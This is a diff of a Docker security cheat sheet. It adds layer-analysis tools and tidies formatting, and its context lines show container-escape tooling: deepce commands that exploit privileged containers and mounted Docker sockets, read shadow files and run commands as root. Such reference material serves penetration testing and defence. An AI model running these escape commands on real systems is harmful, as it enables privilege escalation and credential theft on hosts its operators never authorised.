@@ -17,22 +17,33 @@
 
 ## Tools
 
-* [Dockscan](https://github.com/kost/dockscan) : Dockscan is security vulnerability and audit scanner for Docker installations
+* [kost/dockscan](https://github.com/kost/dockscan) : Dockscan is security vulnerability and audit scanner for Docker installations
     ```powershell
     dockscan unix:///var/run/docker.sock
     dockscan -r html -o myreport -v tcp://example.com:5422
     ```
-* [DeepCe](https://github.com/stealthcopter/deepce) : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+* [stealthcopter/deepce](https://github.com/stealthcopter/deepce) : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
     ```powershell
     ./deepce.sh 
     ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
     ./deepce.sh --no-enumeration --exploit SOCK --shadow
     ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
     ```
+* [orisano/dlayer](https://github.com/orisano/dlayer) : dlayer is docker layer analyzer.
+    ```powershell
+    docker pull orisano/dlayer
+    docker save image:tag | dlayer -i
+    ```
+* [wagoodman/dive](https://github.com/wagoodman/dive) : A tool for exploring each layer in a docker image
+    ```powershell
+    alias dive="docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive"
+    dive <your-image-tag>
+    ```
 
 ## Mounted Docker Socket
 
 Prerequisite:
+
 * Socker mounted as volume : `- "/var/run/docker.sock:/var/run/docker.sock"`
 
 Usually found in `/var/run/docker.sock`, for example for Portainer.
@@ -72,6 +83,7 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 ## Open Docker API Port
 
 Prerequisite:
+
 * Docker runned with `-H tcp://0.0.0.0:XXXX`
 
 ```powershell
@@ -136,8 +148,9 @@ docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io
 ## Exploit privileged container abusing the Linux cgroup v1
 
 Prerequisite (at least one): 
- * `--privileged`
- * `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` flags.
+
+* `--privileged`
+* `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` flags.
 
 
 ### Abusing CAP_SYS_ADMIN capability
